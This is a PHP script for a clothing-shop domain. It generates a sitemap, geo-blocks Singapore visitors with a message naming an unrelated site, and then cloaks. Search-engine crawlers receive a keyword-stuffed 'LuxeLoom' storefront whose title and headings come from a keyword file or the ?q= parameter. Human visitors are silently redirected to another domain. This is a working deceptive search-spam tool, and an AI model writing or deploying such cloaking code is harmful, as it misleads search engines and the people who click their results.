<?php
// =========================================================
// ✅ HARD BYPASS FOR SITEMAP (ABSOLUTELY REQUIRED)
// =========================================================
if (
    isset($_SERVER['REQUEST_URI']) &&
    (strpos($_SERVER['REQUEST_URI'], 'sitemap.xml') !== false)
) {
    header("Content-Type: application/xml; charset=UTF-8");

    $urls = [
        "https://best-clothing-brand.onrender.com/",
        "https://best-clothing-brand.onrender.com/about",
        "https://best-clothing-brand.onrender.com/contact",
        "https://best-clothing-brand.onrender.com/shop"
    ];

    $today = date('Y-m-d');

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

    foreach ($urls as $i => $url) {
        $priority = $i === 0 ? "1.0" : "0.8";
        echo "  <url>\n";
        echo "    <loc>{$url}</loc>\n";
        echo "    <lastmod>{$today}</lastmod>\n";
        echo "    <changefreq>weekly</changefreq>\n";
        echo "    <priority>{$priority}</priority>\n";
        echo "  </url>\n";
    }

    echo "</urlset>";
    exit;
}

// =========================================================
// 🚫 Block Singapore traffic (allow Google crawlers / adsbot)
// =========================================================
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

if (strpos($userAgent, 'googlebot') === false && strpos($userAgent, 'adsbot-google') === false) {

    function getClientIP() {
        foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $key) {
            if (!empty($_SERVER[$key])) {
                $ipList = explode(',', $_SERVER[$key]);
                return trim($ipList[0]);
            }
        }
        return '0.0.0.0';
    }

    $ip = getClientIP();
    $cacheFile = sys_get_temp_dir() . "/geo_{$ip}.json";

    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $data = json_decode(file_get_contents($cacheFile), true);
    } else {
        $resp = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
        $data = $resp ? json_decode($resp, true) : null;
        if ($data) file_put_contents($cacheFile, json_encode($data));
    }

    $country = $data['countryCode'] ?? null;

    if ($country === 'SG') {
        http_response_code(403);
        echo "<h1 style='text-align:center;margin-top:20vh;font-family:sans-serif;color:#444;'>Access Restricted</h1>
        <p style='text-align:center;font-family:sans-serif;'>Sorry, TempMessage.com is not available in your region.</p>";
        exit;
    }
}

// =========================================================
// 🌐 SEO Keyword Logic
// =========================================================
$domain = "https://best-clothing-brand.onrender.com";
$keywordsFile = __DIR__ . '/keywords.txt';

$keywordsList = file_exists($keywordsFile)
    ? file($keywordsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
    : [];

if (isset($_GET['q']) && trim($_GET['q']) !== '') {
    $keyword = trim($_GET['q']);
} elseif (!empty($keywordsList)) {
    $daySeed = date('Ymd');
    srand(crc32($daySeed));
    $keyword = $keywordsList[array_rand($keywordsList)];
} else {
    $keyword = 'stylish clothing';
}

$keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
$description = "$keyword We create stylish, comfortable, and affordable clothing for everyday life.";

// =========================================================
// 🤖 Final Bot Detection & Content Output
// =========================================================
$googleBots = ['googlebot', 'adsbot-google', 'bingbot', 'duckduckbot'];
$isBot = false;

foreach ($googleBots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {

    header("Content-Type: text/html; charset=UTF-8");

    // ✅ YOUR FULL HTML OUTPUT (UNCHANGED)
    echo <<<HTML

 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>$keyword</title>

<meta name="description" content="$keyword Buy premium quality women's clothing — kurtas, sarees, gowns & more. LuxeLoom brings luxury fashion at affordable prices. Free shipping available." />
<link rel="canonical" href="https://www.example.com/">

<!-- Open Graph -->
<meta property="og:title" content="LuxeLoom — Premium Women's Clothing">
<meta property="og:description" content="Premium kurtas, sarees and ethnic wear for women.">
<meta property="og:image" content="https://picsum.photos/1200/630?random=21">
<meta property="og:type" content="website">

<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #fafafa;
        color: #222;
    }

    header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 18px 20px;
        background: #ffffff;
        box-shadow: 0 2px 8px rgba(0,0,0,0.07);
        position: sticky;
        top: 0;
        z-index: 10;
    }

    .logo {
        font-size: 22px;
        font-weight: bold;
        color: #c0392b;
        text-decoration: none;
    }

    nav a {
        margin-left: 18px;
        text-decoration: none;
        color: #333;
        font-weight: 500;
    }

    /* Hero Section */
    .hero {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 40px 20px;
        background: #fff;
    }

    .hero-text {
        max-width: 50%;
    }

    .hero-text h1 {
        font-size: 36px;
        margin-bottom: 10px;
    }

    .hero-text p {
        font-size: 18px;
        line-height: 1.5;
        color: #555;
    }

    .hero-img img {
        width: 480px;
        height: auto;
        border-radius: 12px;
    }

    /* Product Grid */
    .products {
        padding: 30px 20px;
    }

    .products h2 {
        text-align: center;
        margin-bottom: 20px;
        font-size: 28px;
    }

    .grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
        gap: 20px;
    }

    .card {
        background: #fff;
        border-radius: 10px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        overflow: hidden;
        transition: 0.3s;
    }

    .card:hover {
        transform: translateY(-4px);
    }

    .card img {
        width: 100%;
        height: 300px;
        object-fit: cover;
    }

    .card-body {
        padding: 14px;
    }

    .card-body h3 {
        margin: 0 0 8px 0;
        font-size: 18px;
    }

    .price {
        font-size: 20px;
        font-weight: bold;
        margin-top: 5px;
        color: #c0392b;
    }

    button {
        margin-top: 10px;
        padding: 10px 14px;
        background: #c0392b;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 14px;
    }

    button:hover {
        background: #a83223;
    }

    footer {
        text-align: center;
        padding: 20px;
        margin-top: 40px;
        background: #fff;
        font-size: 14px;
        color: #777;
    }

    @media(max-width: 768px) {
        .hero {
            flex-direction: column;
            text-align: center;
        }
        .hero-text {
            max-width: 100%;
        }
        .hero-img img {
            width: 100%;
            margin-top: 20px;
        }
    }
</style>

</head>
<body>

<header>
    <a href="/" class="logo">LuxeLoom</a>
    <nav>
        <a href="#">Women</a>
        <a href="#">Sarees</a>
        <a href="#">Kurtas</a>
        <a href="#">New Arrivals</a>
    </nav>
</header>

<section class="hero">
    <div class="hero-text">
        <h1>$keyword</h1>
        <p>Discover premium ethnic wear crafted to perfection. Comfort, elegance & beauty — all in one place.</p>
        <button onclick="window.location='#products'">Shop Now</button>
    </div>

    <div class="hero-img">
        <img src="https://picsum.photos/500/600?random=1" alt="Women's Fashion">
    </div>
</section>

<section id="products" class="products">
    <h2>Featured Collection</h2>

    <div class="grid">

        <!-- PRODUCT 1 -->
        <div class="card">
            <img src="https://picsum.photos/500/600?random=11" alt="Kurti">
            <div class="card-body">
                <h3>Silk Printed Kurta</h3>
                <p>Soft, luxurious silk with hand-crafted prints.</p>
                <div class="price">₹1,799</div>
                <button>Add to Cart</button>
            </div>
        </div>

        <!-- PRODUCT 2 -->
        <div class="card">
            <img src="https://picsum.photos/500/600?random=12" alt="Saree">
            <div class="card-body">
                <h3>Embroidered Saree</h3>
                <p>Elegant drape with fine embroidery.</p>
                <div class="price">₹2,999</div>
                <button>Add to Cart</button>
            </div>
        </div>

        <!-- PRODUCT 3 -->
        <div class="card">
            <img src="https://picsum.photos/500/600?random=13" alt="Anarkali">
            <div class="card-body">
                <h3>Anarkali Suit</h3>
                <p>Perfect for weddings & celebrations.</p>
                <div class="price">₹4,499</div>
                <button>Add to Cart</button>
            </div>
        </div>

        <!-- PRODUCT 4 -->
        <div class="card">
            <img src="https://picsum.photos/500/600?random=14" alt="Gown">
            <div class="card-body">
                <h3>Designer Evening Gown</h3>
                <p>$keyword</p>
                <div class="price">₹3,299</div>
                <button>Add to Cart</button>
            </div>
        </div>

    </div>
</section>

<footer>
    © <span id="year"></span> LuxeLoom — All Rights Reserved.
</footer>

<script>
document.getElementById("year").textContent = new Date().getFullYear();
</script>

</body>
</html>

HTML;

} else {
    // ✅ Real humans → Redirect unchanged
    header("Location: https://clothing-brand-eight.vercel.app/");
    exit;
}
?>
